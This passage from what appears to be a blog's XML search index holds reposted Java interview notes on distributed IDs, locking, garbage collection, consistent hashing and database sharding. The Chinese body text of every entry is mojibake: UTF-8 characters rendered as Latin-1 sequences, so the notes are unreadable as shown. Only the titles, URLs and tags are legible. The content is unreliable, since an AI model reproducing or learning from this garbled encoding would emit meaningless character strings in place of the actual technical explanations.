ä¹Ÿæ˜¯å¼ºä¾èµ–ä¸æ•°æ®åº“ï¼Œå¹¶ä¸”å¦‚æœå…¶ä¸­ä¸€å°æŒ‚æ‰äº†é‚£å°±ä¸æ˜¯ç»å¯¹é€’å¢äº†ã€‚ æœ¬åœ° UUID ç”Ÿæˆè¿˜å¯ä»¥é‡‡ç”¨ UUID çš„æ–¹å¼ç”Ÿæˆå”¯ä¸€ IDï¼Œç”±äºæ˜¯åœ¨æœ¬åœ°ç”Ÿæˆæ²¡æœ‰äº†ç½‘ç»œä¹‹ç±»çš„æ¶ˆè€—ï¼Œæ‰€æœ‰æ•ˆç‡éå¸¸é«˜ã€‚ ä½†ä¹Ÿæœ‰ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š ç”Ÿæˆçš„ ID æ˜¯æ— åºæ€§çš„ï¼Œä¸èƒ½åšåˆ°è¶‹åŠ¿é€’å¢ã€‚ ç”±äºæ˜¯å­—ç¬¦ä¸²å¹¶ä¸”ä¸æ˜¯é€’å¢ï¼Œæ‰€ä»¥ä¸å¤ªé€‚åˆç”¨ä½œä¸»é”®ã€‚ é‡‡ç”¨æœ¬åœ°æ—¶é—´è¿™ç§åšæ³•éå¸¸ç®€å•ï¼Œå¯ä»¥åˆ©ç”¨æœ¬åœ°çš„æ¯«ç§’æ•°åŠ ä¸Šä¸€äº›ä¸šåŠ¡ ID æ¥ç”Ÿæˆå”¯ä¸€IDï¼Œè¿™æ ·å¯ä»¥åšåˆ°è¶‹åŠ¿é€’å¢ï¼Œå¹¶ä¸”æ˜¯åœ¨æœ¬åœ°ç”Ÿæˆæ•ˆç‡ä¹Ÿå¾ˆé«˜ã€‚ ä½†æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºç‚¹:å½“å¹¶å‘é‡è¶³å¤Ÿé«˜çš„æ—¶å€™å”¯ä¸€æ€§å°±ä¸èƒ½ä¿è¯äº†ã€‚ Twitter é›ªèŠ±ç®—æ³•å¯ä»¥åŸºäº Twitter çš„ Snowflake ç®—æ³•æ¥å®ç°ã€‚å®ƒä¸»è¦æ˜¯ä¸€ç§åˆ’åˆ†å‘½åç©ºé—´çš„ç®—æ³•ï¼Œå°†ç”Ÿæˆçš„ ID æŒ‰ç…§æœºå™¨ã€æ—¶é—´ç­‰æ¥è¿›è¡Œæ ‡å¿—ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java-lock]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FJava-lock%2F</url>
    <content type="text"><![CDATA[å¯¹é”çš„ä¸€äº›è®¤çŸ¥ æœ‰å“ªäº›é”åŒä¸€è¿›ç¨‹é‡å…¥é”ä½¿ç”¨ ReentrantLock è·å–é”çš„æ—¶å€™ä¼šä¼šåˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦ä¸ºè·å–é”çš„çº¿ç¨‹ï¼Œå¦‚æœæ˜¯åˆ™å°†åŒæ­¥çš„çŠ¶æ€ +1 ,é‡Šæ”¾é”çš„æ—¶å€™åˆ™å°†çŠ¶æ€ -1ã€‚åªæœ‰å°†åŒæ­¥çŠ¶æ€çš„æ¬¡æ•°ç½®ä¸º 0 çš„æ—¶å€™æ‰ä¼šæœ€ç»ˆé‡Šæ”¾é”ã€‚ è¯»å†™é”ä½¿ç”¨ ReentrantReadWriteLock ,åŒæ—¶ç»´æŠ¤ä¸€å¯¹é”ï¼šè¯»é”å’Œå†™é”ã€‚å½“å†™çº¿ç¨‹è®¿é—®æ—¶åˆ™å…¶ä»–æ‰€æœ‰é”éƒ½å°†é˜»å¡ï¼Œè¯»çº¿ç¨‹è®¿é—®æ—¶åˆ™ä¸ä¼šã€‚é€šè¿‡è¯»å†™é”çš„åˆ†ç¦»å¯ä»¥å¾ˆå¤§ç¨‹åº¦çš„æé«˜å¹¶å‘é‡å’Œååé‡ã€‚ ä¸åŒè¿›ç¨‹åˆ†å¸ƒå¼é”ï¼š åŸºäºæ•°æ®åº“å¯ä»¥åˆ›å»ºä¸€å¼ è¡¨ï¼Œå°†å…¶ä¸­çš„æŸä¸ªå­—æ®µè®¾ç½®ä¸ºå”¯ä¸€ç´¢å¼•ï¼Œå½“å¤šä¸ªè¯·æ±‚è¿‡æ¥çš„æ—¶å€™åªæœ‰æ–°å»ºè®°å½•æˆåŠŸçš„è¯·æ±‚æ‰ç®—è·å–åˆ°é”ï¼Œå½“ä½¿ç”¨å®Œæ¯•åˆ é™¤è¿™æ¡è®°å½•çš„æ—¶å€™å³é‡Šæ”¾é”ã€‚ å­˜åœ¨çš„é—®é¢˜: æ•°æ®åº“å•ç‚¹é—®é¢˜ï¼ŒæŒ‚äº†æ€ä¹ˆåŠï¼Ÿ ä¸æ˜¯é‡å…¥é”ï¼ŒåŒä¸€è¿›ç¨‹æ— æ³•åœ¨é‡Šæ”¾é”ä¹‹å‰å†æ¬¡è·å¾—é”ï¼Œå› ä¸ºæ•°æ®åº“ä¸­å·²ç»å­˜åœ¨äº†ä¸€æ¡è®°å½•äº†ã€‚ é”æ˜¯éé˜»å¡çš„ï¼Œä¸€æ—¦ insert å¤±è´¥åˆ™ä¼šç«‹å³è¿”å›ï¼Œå¹¶ä¸ä¼šè¿›å…¥é˜»å¡é˜Ÿåˆ—åªèƒ½ä¸‹ä¸€æ¬¡å†æ¬¡è·å–ã€‚ é”æ²¡æœ‰å¤±æ•ˆæ—¶é—´ï¼Œå¦‚æœé‚£ä¸ªè¿›ç¨‹è§£é”å¤±è´¥é‚£å°±æ²¡æœ‰è¯·æ±‚å¯ä»¥å†æ¬¡è·å–é”äº†ã€‚ è§£å†³æ–¹æ¡ˆ: æ•°æ®åº“åˆ‡æ¢ä¸ºä¸»ä»ï¼Œä¸å­˜åœ¨å•ç‚¹ã€‚ åœ¨è¡¨ä¸­åŠ å…¥ä¸€ä¸ªåŒæ­¥çŠ¶æ€å­—æ®µï¼Œæ¯æ¬¡è·å–é”çš„æ˜¯åŠ  1 ï¼Œé‡Šæ”¾é”çš„æ—¶å€™-1ï¼Œå½“çŠ¶æ€ä¸º 0 çš„æ—¶å€™å°±åˆ é™¤è¿™æ¡è®°å½•ï¼Œå³é‡Šæ”¾é”ã€‚ éé˜»å¡çš„æƒ…å†µå¯ä»¥ç”¨ while å¾ªç¯æ¥å®ç°ï¼Œå¾ªç¯çš„æ—¶å€™è®°å½•æ—¶é—´ï¼Œè¾¾åˆ° X ç§’è®°ä¸ºè¶…æ—¶ï¼Œbreakã€‚ å¯ä»¥å¼€å¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡æ¯éš”ä¸€æ®µæ—¶é—´æ‰«ææ‰¾å‡ºå¤šå°‘ X ç§’éƒ½æ²¡æœ‰è¢«åˆ é™¤çš„è®°å½•ï¼Œä¸»åŠ¨åˆ é™¤è¿™æ¡è®°å½•ã€‚ åŸºäº Redisä½¿ç”¨ setNX(key) setEX(timeout) å‘½ä»¤ï¼Œåªæœ‰åœ¨è¯¥ key ä¸å­˜åœ¨çš„æ—¶å€™åˆ›å»ºå’Œè¿™ä¸ª keyï¼Œå°±ç›¸å½“äºè·å–äº†é”ã€‚ç”±äºæœ‰è¶…æ—¶æ—¶é—´ï¼Œæ‰€ä»¥è¿‡äº†è§„å®šæ—¶é—´ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥é¿å…æ­»é”ã€‚ å¯ä»¥å‚è€ƒï¼š åŸºäº Redis çš„åˆ†å¸ƒå¼é” åŸºäº ZK]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GarbageCollection]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FGarbageCollection%2F</url>
    <content type="text"><![CDATA[åƒåœ¾å›æ”¶ åƒåœ¾å›æ”¶ä¸»è¦æ€è€ƒä¸‰ä»¶äº‹æƒ…: å“ªç§å†…å­˜éœ€è¦å›æ”¶ï¼Ÿ ä»€ä¹ˆæ—¶å€™å›æ”¶ï¼Ÿ æ€ä¹ˆå›æ”¶ï¼Ÿ å¯¹è±¡æ˜¯å¦å­˜æ´»å¼•ç”¨è®¡æ•°æ³•è¿™æ˜¯ä¸€ç§éå¸¸ç®€å•æ˜“ç†è§£çš„å›æ”¶ç®—æ³•ã€‚æ¯å½“æœ‰ä¸€ä¸ªåœ°æ–¹å¼•ç”¨ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™åˆ™åœ¨å¼•ç”¨è®¡æ•°å™¨ä¸Š +1ï¼Œå½“å¤±æ•ˆçš„æ—¶å€™å°± -1ï¼Œæ— è®ºä»€ä¹ˆæ—¶å€™è®¡æ•°å™¨ä¸º 0 çš„æ—¶å€™åˆ™è®¤ä¸ºè¯¥å¯¹è±¡æ­»äº¡å¯ä»¥å›æ”¶äº†ã€‚ è¿™ç§ç®—æ³•è™½ç„¶ç®€å•é«˜æ•ˆï¼Œä½†æ˜¯å´æ— æ³•è§£å†³å¾ªç¯å¼•ç”¨çš„é—®é¢˜ï¼Œå› æ­¤ Java è™šæ‹Ÿæœºå¹¶æ²¡æœ‰é‡‡ç”¨è¿™ç§ç®—æ³•ã€‚ å¯è¾¾æ€§åˆ†æç®—æ³•ä¸»æµçš„è¯­è¨€å…¶å®éƒ½æ˜¯é‡‡ç”¨å¯è¾¾æ€§åˆ†æç®—æ³•: å¯è¾¾æ€§ç®—æ³•æ˜¯é€šè¿‡ä¸€ä¸ªç§°ä¸º GC Roots çš„å¯¹è±¡å‘ä¸‹æœç´¢ï¼Œæ•´ä¸ªæœç´¢è·¯å¾„å°±ç§°ä¸ºå¼•ç”¨é“¾ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ° GC Roots æ²¡æœ‰ä»»ä½•å¼•ç”¨é“¾ JVM å°±è®¤ä¸ºè¯¥å¯¹è±¡æ˜¯å¯ä»¥è¢«å›æ”¶çš„ã€‚ å¦‚å›¾:Object1ã€2ã€3ã€4 éƒ½æ˜¯å­˜æ´»çš„å¯¹è±¡ï¼Œè€Œ Object5ã€6ã€7éƒ½æ˜¯å¯å›æ”¶å¯¹è±¡ã€‚ å¯ä»¥ç”¨ä½œ GC-Roots çš„å¯¹è±¡æœ‰: æ–¹æ³•åŒºä¸­é™æ€å˜é‡æ‰€å¼•ç”¨çš„å¯¹è±¡ã€‚ è™šæ‹Ÿæœºæ ˆä¸­æ‰€å¼•ç”¨çš„å¯¹è±¡ã€‚ åƒåœ¾å›æ”¶ç®—æ³•æ ‡è®°-æ¸…é™¤ç®—æ³•æ ‡è®°æ¸…é™¤ç®—æ³•åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼Œæ ‡è®°å’Œæ¸…é™¤ã€‚é¦–å…ˆå°†éœ€è¦å›æ”¶çš„å¯¹è±¡æ ‡è®°èµ·æ¥ï¼Œç„¶åç»Ÿä¸€æ¸…é™¤ã€‚ä½†æ˜¯å­˜åœ¨ä¸¤ä¸ªä¸»è¦çš„é—®é¢˜: æ ‡è®°å’Œæ¸…é™¤çš„æ•ˆç‡éƒ½ä¸é«˜ã€‚ æ¸…é™¤ä¹‹åå®¹æ˜“å‡ºç°ä¸è¿ç»­å†…å­˜ï¼Œå½“éœ€è¦åˆ†é…ä¸€ä¸ªè¾ƒå¤§å†…å­˜æ—¶å°±ä¸å¾—ä¸éœ€è¦è¿›è¡Œä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚ æ ‡è®°æ¸…é™¤è¿‡ç¨‹å¦‚ä¸‹: å¤åˆ¶ç®—æ³•å¤åˆ¶ç®—æ³•æ˜¯å°†å†…å­˜åˆ’åˆ†ä¸ºä¸¤å—å¤§å°ç›¸ç­‰çš„åŒºåŸŸï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶éƒ½åªç”¨å…¶ä¸­ä¸€å—åŒºåŸŸï¼Œå½“å‘ç”Ÿåƒåœ¾å›æ”¶æ—¶ä¼šå°†å­˜æ´»çš„å¯¹è±¡å…¨éƒ¨å¤åˆ¶åˆ°æœªä½¿ç”¨çš„åŒºåŸŸï¼Œç„¶åå¯¹ä¹‹å‰çš„åŒºåŸŸè¿›è¡Œå…¨éƒ¨å›æ”¶ã€‚ è¿™æ ·ç®€å•é«˜æ•ˆï¼Œè€Œä¸”è¿˜ä¸å­˜åœ¨æ ‡è®°æ¸…é™¤ç®—æ³•ä¸­çš„å†…å­˜ç¢ç‰‡é—®é¢˜ï¼Œä½†å°±æ˜¯æœ‰ç‚¹æµªè´¹å†…å­˜ã€‚ åœ¨æ–°ç”Ÿä»£ä¼šä½¿ç”¨è¯¥ç®—æ³•ã€‚ æ–°ç”Ÿä»£ä¸­åˆ†ä¸ºä¸€ä¸ª Eden åŒºå’Œä¸¤ä¸ª Survivor åŒºã€‚é€šå¸¸ä¸¤ä¸ªåŒºåŸŸçš„æ¯”ä¾‹æ˜¯ 8:1:1 ï¼Œä½¿ç”¨æ—¶ä¼šç”¨åˆ° Eden åŒºå’Œå…¶ä¸­ä¸€ä¸ª Survivor åŒºã€‚å½“å‘ç”Ÿå›æ”¶æ—¶åˆ™ä¼šå°†è¿˜å­˜æ´»çš„å¯¹è±¡ä» Eden ï¼ŒSurvivor åŒºæ‹·è´åˆ°å¦ä¸€ä¸ª Survivor åŒºï¼Œå½“è¯¥åŒºåŸŸå†…å­˜ä¹Ÿä¸è¶³æ—¶åˆ™ä¼šä½¿ç”¨åˆ†é…æ‹…ä¿åˆ©ç”¨è€å¹´ä»£æ¥å­˜æ”¾å†…å­˜ã€‚ å¤åˆ¶ç®—æ³•è¿‡ç¨‹ï¼š æ ‡è®°æ•´ç†ç®—æ³•å¤åˆ¶ç®—æ³•å¦‚æœåœ¨å­˜æ´»å¯¹è±¡è¾ƒå¤šæ—¶æ•ˆç‡æ˜æ˜¾ä¼šé™ä½ï¼Œç‰¹åˆ«æ˜¯åœ¨è€å¹´ä»£ä¸­å¹¶æ²¡æœ‰å¤šä½™çš„å†…å­˜åŒºåŸŸå¯ä»¥æä¾›å†…å­˜æ‹…ä¿ã€‚ æ‰€ä»¥è€å¹´ä»£ä¸­ä½¿ç”¨çš„æ—¶å€™åˆ†é…æ•´ç†ç®—æ³•ï¼Œå®ƒçš„åŸç†å’Œåˆ†é…æ¸…é™¤ç®—æ³•ç±»ä¼¼ï¼Œåªæ˜¯æœ€åä¸€æ­¥çš„æ¸…é™¤æ”¹ä¸ºäº†å°†å­˜æ´»å¯¹è±¡å…¨éƒ¨ç§»åŠ¨åˆ°ä¸€ç«¯ï¼Œç„¶åå†å°†è¾¹ç•Œä¹‹å¤–çš„å†…å­˜å…¨éƒ¨å›æ”¶ã€‚ åˆ†ä»£å›æ”¶ç®—æ³•ç°ä»£å¤šæ•°çš„å•†ç”¨ JVM çš„åƒåœ¾æ”¶é›†å™¨éƒ½æ˜¯é‡‡ç”¨çš„åˆ†ä»£å›æ”¶ç®—æ³•ï¼Œå’Œä¹‹å‰æ‰€æåˆ°çš„ç®—æ³•å¹¶æ²¡æœ‰æ–°çš„å†…å®¹ã€‚ åªæ˜¯å°† Java å †åˆ†ä¸ºäº†æ–°ç”Ÿä»£å’Œè€å¹´ä»£ã€‚ç”±äºæ–°ç”Ÿä»£ä¸­å­˜æ´»å¯¹è±¡è¾ƒå°‘ï¼Œæ‰€ä»¥é‡‡ç”¨å¤åˆ¶ç®—æ³•ï¼Œç®€å•é«˜æ•ˆã€‚ è€Œè€å¹´ä»£ä¸­å¯¹è±¡è¾ƒå¤šï¼Œå¹¶ä¸”æ²¡æœ‰å¯ä»¥æ‹…ä¿çš„å†…å­˜åŒºåŸŸï¼Œæ‰€ä»¥ä¸€èˆ¬é‡‡ç”¨æ ‡è®°æ¸…é™¤æˆ–è€…æ˜¯æ ‡è®°æ•´ç†ç®—æ³•ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Consistent-Hash]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FConsistent-Hash%2F</url>
    <content type="text"><![CDATA[ä¸€è‡´ Hash ç®—æ³•å½“æˆ‘ä»¬åœ¨åšæ•°æ®åº“åˆ†åº“åˆ†è¡¨æˆ–è€…æ˜¯åˆ†å¸ƒå¼ç¼“å­˜æ—¶ï¼Œä¸å¯é¿å…çš„éƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜: å¦‚ä½•å°†æ•°æ®å‡åŒ€çš„åˆ†æ•£åˆ°å„ä¸ªèŠ‚ç‚¹ä¸­ï¼Œå¹¶ä¸”å°½é‡çš„åœ¨åŠ å‡èŠ‚ç‚¹æ—¶èƒ½ä½¿å—å½±å“çš„æ•°æ®æœ€å°‘ã€‚ Hash å–æ¨¡éšæœºæ”¾ç½®å°±ä¸è¯´äº†ï¼Œä¼šå¸¦æ¥å¾ˆå¤šé—®é¢˜ã€‚é€šå¸¸æœ€å®¹æ˜“æƒ³åˆ°çš„æ–¹æ¡ˆå°±æ˜¯ hash å–æ¨¡äº†ã€‚ å¯ä»¥å°†ä¼ å…¥çš„ Key æŒ‰ç…§ index = hash(key) % N è¿™æ ·æ¥è®¡ç®—å‡ºéœ€è¦å­˜æ”¾çš„èŠ‚ç‚¹ã€‚å…¶ä¸­ hash å‡½æ•°æ˜¯ä¸€ä¸ªå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ­£æ•´æ•°çš„å“ˆå¸Œæ˜ å°„æ–¹æ³•ï¼ŒN å°±æ˜¯èŠ‚ç‚¹çš„æ•°é‡ã€‚ è¿™æ ·å¯ä»¥æ»¡è¶³æ•°æ®çš„å‡åŒ€åˆ†é…ï¼Œä½†æ˜¯è¿™ä¸ªç®—æ³•çš„å®¹é”™æ€§å’Œæ‰©å±•æ€§éƒ½è¾ƒå·®ã€‚ æ¯”å¦‚å¢åŠ æˆ–åˆ é™¤äº†ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œæ‰€æœ‰çš„ Key éƒ½éœ€è¦é‡æ–°è®¡ç®—ï¼Œæ˜¾ç„¶è¿™æ ·æˆæœ¬è¾ƒé«˜ï¼Œä¸ºæ­¤éœ€è¦ä¸€ä¸ªç®—æ³•æ»¡è¶³åˆ†å¸ƒå‡åŒ€åŒæ—¶ä¹Ÿè¦æœ‰è‰¯å¥½çš„å®¹é”™æ€§å’Œæ‹“å±•æ€§ã€‚ ä¸€è‡´ Hash ç®—æ³•ä¸€è‡´ Hash ç®—æ³•æ˜¯å°†æ‰€æœ‰çš„å“ˆå¸Œå€¼æ„æˆäº†ä¸€ä¸ªç¯ï¼Œå…¶èŒƒå›´åœ¨ 0 ~ 2^32-1ã€‚å¦‚ä¸‹å›¾ï¼š ä¹‹åå°†å„ä¸ªèŠ‚ç‚¹æ•£åˆ—åˆ°è¿™ä¸ªç¯ä¸Šï¼Œå¯ä»¥ç”¨èŠ‚ç‚¹çš„ IPã€hostname è¿™æ ·çš„å”¯ä¸€æ€§å­—æ®µä½œä¸º Key è¿›è¡Œ hash(key)ï¼Œæ•£åˆ—ä¹‹åå¦‚ä¸‹ï¼š ä¹‹åéœ€è¦å°†æ•°æ®å®šä½åˆ°å¯¹åº”çš„èŠ‚ç‚¹ä¸Šï¼Œä½¿ç”¨åŒæ ·çš„ hash å‡½æ•° å°† Key ä¹Ÿæ˜ å°„åˆ°è¿™ä¸ªç¯ä¸Šã€‚ è¿™æ ·æŒ‰ç…§é¡ºæ—¶é’ˆæ–¹å‘å°±å¯ä»¥æŠŠ k1 å®šä½åˆ° N1èŠ‚ç‚¹ï¼Œk2 å®šä½åˆ° N3èŠ‚ç‚¹ï¼Œk3 å®šä½åˆ° N2èŠ‚ç‚¹ã€‚ å®¹é”™æ€§è¿™æ—¶å‡è®¾ N1 å®•æœºäº†ï¼š ä¾ç„¶æ ¹æ®é¡ºæ—¶é’ˆæ–¹å‘ï¼Œk2 å’Œ k3 ä¿æŒä¸å˜ï¼Œåªæœ‰ k1 è¢«é‡æ–°æ˜ å°„åˆ°äº† N3ã€‚è¿™æ ·å°±å¾ˆå¥½çš„ä¿è¯äº†å®¹é”™æ€§ï¼Œå½“ä¸€ä¸ªèŠ‚ç‚¹å®•æœºæ—¶åªä¼šå½±å“åˆ°å°‘å°‘éƒ¨åˆ†çš„æ•°æ®ã€‚ æ‹“å±•æ€§å½“æ–°å¢ä¸€ä¸ªèŠ‚ç‚¹æ—¶: åœ¨ N2 å’Œ N3 ä¹‹é—´æ–°å¢äº†ä¸€ä¸ªèŠ‚ç‚¹ N4 ï¼Œè¿™æ—¶ä¼šå‘ç°å—å°è±¡çš„æ•°æ®åªæœ‰ k3ï¼Œå…¶ä½™æ•°æ®ä¹Ÿæ˜¯ä¿æŒä¸å˜ï¼Œæ‰€ä»¥è¿™æ ·ä¹Ÿå¾ˆå¥½çš„ä¿è¯äº†æ‹“å±•æ€§ã€‚ è™šæ‹ŸèŠ‚ç‚¹åˆ°ç›®å‰ä¸ºæ­¢è¯¥ç®—æ³•ä¾ç„¶ä¹Ÿæœ‰ç‚¹é—®é¢˜: å½“èŠ‚ç‚¹è¾ƒå°‘æ—¶ä¼šå‡ºç°æ•°æ®åˆ†å¸ƒä¸å‡åŒ€çš„æƒ…å†µï¼š è¿™æ ·ä¼šå¯¼è‡´å¤§éƒ¨åˆ†æ•°æ®éƒ½åœ¨ N1 èŠ‚ç‚¹ï¼Œåªæœ‰å°‘é‡çš„æ•°æ®åœ¨ N2 èŠ‚ç‚¹ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸€è‡´å“ˆå¸Œç®—æ³•å¼•å…¥äº†è™šæ‹ŸèŠ‚ç‚¹ã€‚å°†æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½è¿›è¡Œå¤šæ¬¡ hashï¼Œç”Ÿæˆå¤šä¸ªèŠ‚ç‚¹æ”¾ç½®åœ¨ç¯ä¸Šç§°ä¸ºè™šæ‹ŸèŠ‚ç‚¹: è®¡ç®—æ—¶å¯ä»¥åœ¨ IP ååŠ ä¸Šç¼–å·æ¥ç”Ÿæˆå“ˆå¸Œå€¼ã€‚ è¿™æ ·åªéœ€è¦åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¤šä¸€æ­¥ç”±è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å®é™…èŠ‚ç‚¹çš„æ­¥éª¤å³å¯è®©å°‘é‡èŠ‚ç‚¹ä¹Ÿèƒ½æ»¡è¶³å‡åŒ€æ€§ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DB-split]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FDB-split%2F</url>
    <content type="text"><![CDATA[æ•°æ®åº“æ°´å¹³å‚ç›´æ‹†åˆ†å½“æ•°æ®åº“é‡éå¸¸å¤§çš„æ—¶å€™ï¼ŒDB å·²ç»æˆä¸ºç³»ç»Ÿç“¶é¢ˆæ—¶å°±å¯ä»¥è€ƒè™‘è¿›è¡Œæ°´å¹³å‚ç›´æ‹†åˆ†äº†ã€‚ æ°´å¹³æ‹†åˆ†ä¸€èˆ¬æ°´å¹³æ‹†åˆ†æ˜¯æ ¹æ®è¡¨ä¸­çš„æŸä¸€å­—æ®µ(é€šå¸¸æ˜¯ä¸»é”® ID )å–æ¨¡å¤„ç†ï¼Œå°†ä¸€å¼ è¡¨çš„æ•°æ®æ‹†åˆ†åˆ°å¤šä¸ªè¡¨ä¸­ã€‚è¿™æ ·æ¯å¼ è¡¨çš„è¡¨ç»“æ„æ˜¯ç›¸åŒçš„ä½†æ˜¯æ•°æ®ä¸åŒã€‚ ä¸ä½†å¯ä»¥é€šè¿‡ ID å–æ¨¡åˆ†è¡¨è¿˜å¯ä»¥é€šè¿‡æ—¶é—´åˆ†è¡¨ï¼Œæ¯”å¦‚æ¯æœˆç”Ÿæˆä¸€å¼ è¡¨ã€‚æŒ‰ç…§èŒƒå›´åˆ†è¡¨ä¹Ÿæ˜¯å¯è¡Œçš„:ä¸€å¼ è¡¨åªå­˜å‚¨ 0~1000Wçš„æ•°æ®ï¼Œè¶…è¿‡åªå°±è¿›è¡Œåˆ†è¡¨ï¼Œè¿™æ ·åˆ†è¡¨çš„ä¼˜ç‚¹æ˜¯æ‰©å±•çµæ´»ï¼Œä½†æ˜¯å­˜åœ¨çƒ­ç‚¹æ•°æ®ã€‚ æŒ‰ç…§å–æ¨¡åˆ†è¡¨æ‹†åˆ†ä¹‹åæˆ‘ä»¬çš„æŸ¥è¯¢ã€ä¿®æ”¹ã€åˆ é™¤ä¹Ÿéƒ½æ˜¯å–æ¨¡ã€‚æ¯”å¦‚æ–°å¢ä¸€æ¡æ•°æ®çš„æ—¶å€™å¾€å¾€éœ€è¦ä¸€å¼ ä¸´æ—¶è¡¨æ¥ç”Ÿæˆ ID,ç„¶åæ ¹æ®ç”Ÿæˆçš„ ID å–æ¨¡è®¡ç®—å‡ºéœ€è¦å†™å…¥çš„æ˜¯å“ªå¼ è¡¨(ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨æ¥ç”Ÿæˆ ID)ã€‚ åˆ†è¡¨ä¹‹åä¸èƒ½é¿å…çš„å°±æ˜¯æŸ¥è¯¢è¦æ¯”ä»¥å‰å¤æ‚ï¼Œé€šå¸¸ä¸å»ºè®® join ï¼Œä¸€èˆ¬çš„åšæ³•æ˜¯åšä¸¤æ¬¡æŸ¥è¯¢ã€‚ å‚ç›´æ‹†åˆ†å½“ä¸€å¼ è¡¨çš„å­—æ®µè¿‡å¤šæ—¶åˆ™å¯ä»¥è€ƒè™‘å‚ç›´æ‹†åˆ†ã€‚é€šå¸¸æ˜¯å°†ä¸€å¼ è¡¨çš„å­—æ®µæ‰åˆ†ä¸ºä¸»è¡¨ä»¥åŠæ‰©å±•è¡¨ï¼Œä½¿ç”¨é¢‘æ¬¡è¾ƒé«˜çš„å­—æ®µåœ¨ä¸€å¼ è¡¨ï¼Œå…¶ä½™çš„åœ¨ä¸€å¼ è¡¨ã€‚ è¿™é‡Œçš„å¤šè¡¨æŸ¥è¯¢ä¹Ÿä¸å»ºè®®ä½¿ç”¨ join ï¼Œä¾ç„¶å»ºè®®ä½¿ç”¨ä¸¤æ¬¡æŸ¥è¯¢ã€‚ æ‹†åˆ†ä¹‹åå¸¦æ¥çš„é—®é¢˜æ‹†åˆ†ä¹‹åç”±ä¸€å¼ è¡¨å˜ä¸ºäº†å¤šå¼ è¡¨ï¼Œä¸€ä¸ªåº“å˜ä¸ºäº†å¤šä¸ªåº“ã€‚æœ€çªå‡ºçš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯äº‹åŠ¡å¦‚ä½•ä¿è¯ã€‚ ä¸¤æ®µæäº¤æœ€ç»ˆä¸€è‡´æ€§å¦‚æœä¸šåŠ¡å¯¹å¼ºä¸€è‡´æ€§è¦æ±‚ä¸æ˜¯é‚£ä¹ˆé«˜é‚£ä¹ˆæœ€ç»ˆä¸€è‡´æ€§åˆ™æ˜¯ä¸€ç§æ¯”è¾ƒå¥½çš„æ–¹æ¡ˆã€‚ é€šå¸¸çš„åšæ³•å°±æ˜¯è¡¥å¿ï¼Œæ¯”å¦‚ ä¸€ä¸ªä¸šåŠ¡æ˜¯ A è°ƒç”¨ Bï¼Œä¸¤ä¸ªæ‰§è¡ŒæˆåŠŸæ‰ç®—æœ€ç»ˆæˆåŠŸï¼Œå½“ A æˆåŠŸä¹‹åï¼ŒB æ‰§è¡Œå¤±è´¥å¦‚ä½•æ¥é€šçŸ¥ A å‘¢ã€‚ æ¯”è¾ƒå¸¸è§çš„åšæ³•æ˜¯ å¤±è´¥æ—¶ B é€šè¿‡ MQ å°†æ¶ˆæ¯å‘Šè¯‰ Aï¼ŒA å†æ¥è¿›è¡Œå›æ»šã€‚è¿™ç§çš„å‰ææ˜¯ A çš„å›æ»šæ“ä½œå¾—æ˜¯å¹‚ç­‰çš„ï¼Œä¸ç„¶ B é‡å¤å‘æ¶ˆæ¯å°±ä¼šå‡ºç°é—®é¢˜ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ClassLoad]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FClassLoad%2F</url>
